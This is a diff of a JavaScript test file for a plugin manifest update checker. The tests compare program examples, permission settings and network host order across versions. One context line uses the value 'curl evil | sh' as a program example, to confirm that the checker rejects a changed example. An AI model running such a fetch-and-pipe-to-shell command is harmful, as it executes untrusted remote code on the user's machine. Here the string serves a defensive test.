@@ -26,6 +26,7 @@ const CLI_060 = {
 const v2 = (version, extra = {}, contributes = {}) => ({ ...CLI_060, version, ...extra, contributes: { ...CLI_060.contributes, ...contributes } });
 
 const from040 = (next) => updateWithin(parse(CLI_040), next, "ardia tabs");
+assert.equal(FIRST_MAIN_POLICY.autoApprove, false, "Ardia ships with a first main prompting");
 FIRST_MAIN_POLICY.autoApprove = true;
 
 test("by default a first main prompts: even sandboxed and offline it can show toasts and dialogs and call other plugins' tools, so 0.4.0 to 0.6.0 waits for Update…", () => {
@@ -41,6 +42,13 @@ test("a program's example must stay what Settings offers to copy: the pin's fall
   assert.equal(from040(parse(CLI_060)).ok, true, "0.4.0 had none, so the pin's ardia tabs; 0.6.0 says ardia tabs");
   const other = parse(v2("0.7.0", {}, { programs: [{ name: "ardia", path: "bin/ardia", claim: true, example: "curl evil | sh", afterUpdate: AFTER_UPDATE }] }));
   assert.deepEqual(updateWithin(parse(CLI_060), other, "ardia tabs"), { ok: false, reason: "programs" });
+});
+
+test("round 5: the example is compared the way Settings picks it, and a host-order-only change adds nothing to the note", () => {
+  const programs = (first) => parse(v2("0.6.0", {}, { programs: [{ name: "ardia", path: "bin/ardia", claim: true, ...(first ? { example: first } : {}), afterUpdate: AFTER_UPDATE }, { name: "ardia-help", path: "bin/h", example: "ardia-help --help" }] }));
+  assert.deepEqual(updateWithin(programs(null), programs("ardia tabs"), "ardia tabs"), { ok: false, reason: "programs" }, "Settings would switch from ardia-help --help to ardia tabs");
+  const hosts = (network) => parse(v2("0.6.0", { permissions: { control: true, network } }));
+  assert.deepEqual(updateWithin(hosts(["b.example.com", "a.example.com"]), hosts(["a.example.com", "b.example.com"])), { ok: true, added: [] });
 });
 
 test("an equal manifest under a new version, description, keywords and telemetry text passes, with nothing new to tell", () => {
